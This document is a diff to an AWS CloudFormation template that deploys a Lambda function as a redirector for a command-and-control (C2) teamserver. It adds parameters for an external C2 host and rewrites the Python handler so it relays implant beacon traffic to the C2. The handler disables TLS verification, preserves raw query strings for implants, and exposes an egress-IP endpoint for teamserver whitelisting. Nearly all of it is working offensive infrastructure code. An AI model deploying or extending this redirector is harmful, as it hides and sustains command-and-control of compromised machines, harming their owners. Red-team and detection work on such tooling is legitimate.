@@ -18,6 +18,28 @@ Parameters:
     Default: ami-0c02fb55956c7d316
     Description: The Linux AMI to use.
 
+  # Your existing C2 (hostname or IP). Lambda will forward traffic here. Leave empty to use the EC2 in this stack.
+  TeamServerAddress:
+    Type: String
+    Default: ""
+    Description: Existing C2 hostname or IP (e.g. c2.example.com or 10.1.2.3). Leave empty to forward to the EC2 in this stack.
+
+  # Scheme and port for the backend (only used when TeamServerAddress is set).
+  TeamServerScheme:
+    Type: String
+    Default: "https"
+    AllowedValues:
+      - http
+      - https
+    Description: Use http if your C2 listener is on HTTP (e.g. port 80).
+  TeamServerPort:
+    Type: String
+    Default: "443"
+    Description: Port your C2 listens on (e.g. 80 for HTTP, 443 for HTTPS, or 7443).
+
+Conditions:
+  UseExternalC2: !Not [!Equals [!Ref TeamServerAddress, ""]]
+
 ######
 # Part 1:
 # Create the core VPC/subnet components
@@ -192,84 +214,107 @@ Resources:
     Type: AWS::Lambda::Function
     Properties:
       FunctionName: !Sub ${AWS::StackName}-LambdaRedirector
-      Description: Lamda Function used as a redirector to TEAMSERVER
+      Description: Lambda Function used as a redirector to TEAMSERVER
       Handler: index.redirector
-      Runtime: python3.7
+      Runtime: python3.12
+      Timeout: 30
       Role: !GetAtt LambdaRole.Arn
-      VpcConfig:
-        SubnetIds: 
-        - !Ref Subnet
-        SecurityGroupIds:
-        - !Ref SecurityGroup
+      # When using external C2, Lambda must run without VPC to reach the internet (no NAT in this template).
+      # When using in-stack EC2, Lambda stays in VPC to reach C2Server by private IP.
+      VpcConfig: !If
+        - UseExternalC2
+        - !Ref AWS::NoValue
+        - SubnetIds:
+            - !Ref Subnet
+          SecurityGroupIds:
+            - !Ref SecurityGroup
       Environment:
         Variables:
-          TEAMSERVER: !GetAtt C2Server.PrivateIp
+          TEAMSERVER: !If [UseExternalC2, !Ref TeamServerAddress, !GetAtt C2Server.PrivateIp]
+          TEAMSERVER_SCHEME: !If [UseExternalC2, !Ref TeamServerScheme, "https"]
+          TEAMSERVER_PORT: !If [UseExternalC2, !Ref TeamServerPort, "443"]
       Code:
         ZipFile: |
           import base64
           import os
-          import requests
+          import ssl
+          from urllib.request import Request, urlopen
+          from urllib.error import HTTPError, URLError
 
 
           def redirector(event, context):
+              try:
+                  print(event)
 
-              print(event)
+                  teamserver = os.getenv("TEAMSERVER")
+                  if not teamserver:
+                      return {"statusCode": 500, "body": "TEAMSERVER not configured", "headers": {}}
 
-              #######
-              # Forward HTTP request to C2
-              #######
+                  scheme = os.getenv("TEAMSERVER_SCHEME", "https")
+                  port = os.getenv("TEAMSERVER_PORT", "443")
+                  path = event.get("requestContext", {}).get("http", {}).get("path", "/")
+                  # Special path: return the Lambda's outbound IP (so you can whitelist it on your teamserver)
+                  if path.rstrip("/") == "/lambda-egress-ip":
+                      try:
+                          ip_resp = urlopen(Request("https://checkip.amazonaws.com"), timeout=5)
+                          egress_ip = ip_resp.read().decode("utf-8").strip()
+                          return {"statusCode": 200, "body": egress_ip, "headers": {"Content-Type": "text/plain"}}
+                      except Exception as e:
+                          return {"statusCode": 500, "body": "Could not get egress IP: " + str(e), "headers": {"Content-Type": "text/plain"}}
+                  base = scheme + "://" + teamserver
+                  if (scheme == "https" and port != "443") or (scheme == "http" and port != "80"):
+                      base += ":" + port
+                  url = base + path
 
-              # Setup forwarding URL
-              teamserver = os.getenv("TEAMSERVER")
-              url = "https://" + teamserver + event["requestContext"]["http"]["path"]
+                  # Use rawQueryString to preserve exact format (order, multi-value params, encoding)
+                  # C2 implants require the query string as-sent; queryStringParameters parsing can corrupt it
+                  raw_qs = event.get("rawQueryString") or ""
+                  if raw_qs:
+                      url = url + "?" + raw_qs
 
-              # Parse Query String Parameters
-              queryStrings = {}
-              if "queryStringParameters" in event.keys():
-                  for key, value in event["queryStringParameters"].items():
-                      queryStrings[key] = value
+                  method = event.get("requestContext", {}).get("http", {}).get("method", "GET")
+                  inbound_headers = dict(event.get("headers") or {})
+                  # Backend often expects Host: teamserver (e.g. for vhost or CDN routing)
+                  inbound_headers["Host"] = teamserver if ":" not in teamserver else teamserver.split(":")[0]
+                  # For GET/HEAD: don't forward Content-Length or Transfer-Encoding (we send no body).
+                  # Forwarding them causes 400 when teamserver expects a body that never arrives.
+                  if method in ("GET", "HEAD"):
+                      for h in ("content-length", "content-type", "transfer-encoding"):
+                          inbound_headers.pop(h, None)
 
-              # Parse HTTP headers
-              inboundHeaders = {}
-              for key, value in event["headers"].items():
-                  inboundHeaders[key] = value
+                  body = b""
+                  if event.get("body"):
+                      if event.get("isBase64Encoded"):
+                          body = base64.b64decode(event["body"])
+                      else:
+                          body = event["body"].encode("utf-8") if isinstance(event["body"], str) else event["body"]
+                  if method not in ("GET", "POST", "HEAD"):
+                      return {"statusCode": 405, "body": "Method not allowed", "headers": {}}
 
-              # Handle potential base64 encodng of body
-              body = ""
-              if "body" in event.keys():
-                  if event["isBase64Encoded"]:
-                      body = base64.b64decode(event["body"])
-                  else:
-                      body = event["body"]
+                  ctx = ssl.create_default_context()
+                  ctx.check_hostname = False
+                  ctx.verify_mode = ssl.CERT_NONE
+                  req = Request(url, data=body if method == "POST" else None, headers=inbound_headers, method=method)
+                  if method == "HEAD":
+                      req.get_method = lambda: "HEAD"
+                  try:
+                      resp = urlopen(req, context=ctx, timeout=25)
+                      status, out_body, out_headers = resp.status, resp.read(), dict(resp.headers)
+                  except HTTPError as e:
+                      status, out_body, out_headers = e.code, e.read(), dict(e.headers)
+                  except URLError as e:
+                      return {"statusCode": 502, "body": "Backend unreachable: " + str(e.reason), "headers": {"Content-Type": "text/plain"}}
 
-              # Forward request to C2
-              requests.packages.urllib3.disable_warnings() 
-              
-              if event["requestContext"]["http"]["method"] == "GET":
-                  resp = requests.get(url, headers=inboundHeaders, params=queryStrings, verify=False)
-              elif event["requestContext"]["http"]["method"] == "POST":
-                  resp = requests.post(url, headers=inboundHeaders, params=queryStrings, data=body, verify=False)
-              else:
-                  return "ERROR: INVALID REQUEST METHOD! Must be POST or GET"
-
-              ########
-              # Return response to beacon
-              ########
-
-              # Parse outbound HTTP headers
-              outboundHeaders = {}
-              
-              for head, val in resp.headers.items():
-                  outboundHeaders[head] = val
-
-              # build response to beacon
-              response = {
-                  "statusCode": resp.status_code,
-                  "body": resp.text,
-                  "headers": outboundHeaders
-              }
-
-              return response
+                  return {
+                      "statusCode": status,
+                      "body": out_body.decode("utf-8", errors="replace"),
+                      "headers": out_headers
+                  }
+              except Exception as e:
+                  import traceback
+                  err = traceback.format_exc()
+                  print(err)
+                  return {"statusCode": 500, "body": "Lambda error: " + str(e) + "\n" + err, "headers": {"Content-Type": "text/plain"}}
   LambdaRedirectorURL:
     Type: AWS::Lambda::Url
     DependsOn: LambdaRedirector
